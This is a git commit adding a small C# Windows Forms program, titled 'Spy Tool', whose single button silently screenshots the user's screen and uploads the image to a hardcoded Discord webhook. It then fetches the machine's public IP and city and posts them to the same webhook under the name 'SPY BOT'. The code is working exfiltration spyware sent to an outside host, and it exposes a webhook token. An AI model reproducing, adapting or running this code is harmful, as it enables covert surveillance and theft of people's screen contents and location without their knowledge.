957998d2f2d9c1bf75478a4762cc783ecc6e7433
M Abdus Shakur <mabdusshakur12@gmail.com>
2023-11-21 12:02:39 +0600

    first commit

---
+++ Get-User-ip-country-screenshot/Form1.Designer.cs
@@ -0,0 +1,63 @@
+﻿namespace Get_User_ip_country_screenshot
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.sendScreenshot_btn = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // sendScreenshot_btn
+            // 
+            this.sendScreenshot_btn.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.sendScreenshot_btn.Location = new System.Drawing.Point(0, 0);
+            this.sendScreenshot_btn.Name = "sendScreenshot_btn";
+            this.sendScreenshot_btn.Size = new System.Drawing.Size(264, 78);
+            this.sendScreenshot_btn.TabIndex = 0;
+            this.sendScreenshot_btn.Text = "Get User Details";
+            this.sendScreenshot_btn.UseVisualStyleBackColor = true;
+            this.sendScreenshot_btn.Click += new System.EventHandler(this.sendScreenshot_btn_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(264, 78);
+            this.Controls.Add(this.sendScreenshot_btn);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
+            this.Name = "Form1";
+            this.Text = "Spy Tool";
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button sendScreenshot_btn;
+    }
+}
+
---
+++ Get-User-ip-country-screenshot/Form1.cs
@@ -0,0 +1,72 @@
+﻿using System;
+using System.Drawing.Imaging;
+using System.Drawing;
+using System.IO;
+using System.Net.Http;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Collections.Specialized;
+
+
+namespace Get_User_ip_country_screenshot
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private static byte[] postRequest(string endpoint, NameValueCollection pairs)
+        {
+            using (WebClient  webClient = new WebClient())
+            {
+                return webClient.UploadValues(endpoint, pairs);
+            }
+        }
+        private static void function_send_message(string url, string message, string botname)
+        {
+            postRequest(url, new NameValueCollection(){
+                {
+                    "username",
+                    botname
+                },
+                {
+                    "content",
+                    message
+                }
+            });
+        }
+        private void sendScreenshot_btn_Click(object sender, EventArgs e)
+        {
+            string webhook_url = "https://discord.com/api/webhooks/1176399311530106920/lw9e4hZ9mMiRq1XbwGRrn-si7QQD8qWPj6XAcs8cBrjVxH-omMh6SjFtLLBryppPDL7-";
+            var filePath = Environment.CurrentDirectory + "screenshot.png";
+
+            var s_width = Screen.PrimaryScreen.Bounds.Width;
+            var s_height = Screen.PrimaryScreen.Bounds.Height;
+
+            Bitmap bitmap = new Bitmap(s_width, s_height);
+            Rectangle rectangle = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
+            Graphics graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
+            bitmap.Save(filePath, ImageFormat.Png);
+
+            HttpClient client = new HttpClient();
+            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
+
+            var file = File.ReadAllBytes(filePath);
+            multipartFormDataContent.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
+            client.PostAsync(webhook_url, multipartFormDataContent).Wait();
+            client.Dispose();
+
+            // get the ip and city , you can use any other api services
+            WebClient wc = new WebClient();
+            var use_ip = wc.DownloadString("https://ipapi.co/ip");
+            var use_city = wc.DownloadString("https://ipapi.co/city");
+            string messages = "User IP : "+  use_ip + " \nUser City : " + use_city;
+
+            function_send_message(webhook_url, messages, "SPY BOT");
+        }
+    }
+}
